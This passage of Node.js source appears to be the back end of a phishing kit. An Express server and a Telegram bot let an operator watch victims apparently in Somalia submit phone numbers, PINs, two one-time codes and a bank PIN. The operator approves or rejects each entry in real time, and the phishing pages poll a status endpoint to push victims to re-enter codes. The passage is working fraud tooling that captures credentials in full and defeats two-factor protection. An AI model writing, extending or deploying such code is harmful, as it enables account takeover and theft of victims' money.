                        {     }
});

// -------------------- BOT ACTIONS --------------------

// APPROVE
bot.action(/approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    const pin = decodeURIComponent(ctx.match[2]);
    statusStore[phone] = "approved";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const approvedMsg = `✅ <b>LOGIN APPROVED</b>

🆕 <b>NEW USER</b>
🇸🇴 <b>Somalia</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Approved</b>
➡️ <b>Next: First OTP (1/2)</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(approvedMsg);
    await ctx.answerCbQuery("Allowed");
});

// DENY
bot.action(/deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    const pin = decodeURIComponent(ctx.match[2]);
    statusStore[phone] = "denied";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>

🇸🇴 <b>Somalia</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

❌ <b>Status: Rejected</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(deniedMsg);
    await ctx.answerCbQuery("Rejected");
});

// OTP1 CORRECT
bot.action(/otp1_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    const otp = decodeURIComponent(ctx.match[2]);
    statusStore[phone] = "otp1_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>

🇸🇴 <b>Somalia</b>
📱 <b>${phone}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: First OTP verified</b>
➡️ <b>Next: Second OTP (2/2) will be sent</b>
⌛ <b>${currentTime}</b>`;

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg);
    await ctx.answerCbQuery("Verified");
});

// OTP1 WRONG
bot.action(/otp1_wrong\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp1_wrong";
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
    await ctx.answerCbQuery("Wrong Code");
});

// OTP2 CORRECT
bot.action(/otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    const otp = decodeURIComponent(ctx.match[2]);
    statusStore[phone] = "otp2_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>

🇸🇴 <b>Somalia</b>
📱 <b>${phone}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Second OTP verified</b>
✅ <b>Process Complete</b>
⌛ <b>${currentTime}</b>`;

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg2);
    await ctx.answerCbQuery("Finalized");
});

// OTP2 WRONG
bot.action(/otp2_wrong\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp2_wrong";
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
    await ctx.answerCbQuery("Wrong Code");
});

// BANK PIN CORRECT (NEW)
bot.action(/bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    const pin = decodeURIComponent(ctx.match[2]);
    statusStore[phone] = "bank_pin_correct";
    
    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>

🇸🇴 <b>Somalia</b>
📱 <b>${phone}</b>
🔑 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Process Completed</b>
🏁 <b>User redirected to Success page</b>`;

    try {
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(finalizedMsg);
        await ctx.answerCbQuery("Bank PIN Verified");
    } catch (e) { console.error(e.message); }
});

// BANK PIN WRONG (NEW)
bot.action(/bank_wrong\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "bank_pin_wrong";

    try {
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter Bank PIN.</b>`);
        await ctx.answerCbQuery("Wrong Bank PIN");
    } catch (e) { console.error(e.message); }
});

// OTP2 WRONG PIN
bot.action(/otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp2_wrongpin";
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
    await ctx.answerCbQuery("Wrong PIN");
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- START BOT --------------------
(async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
})();

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
          
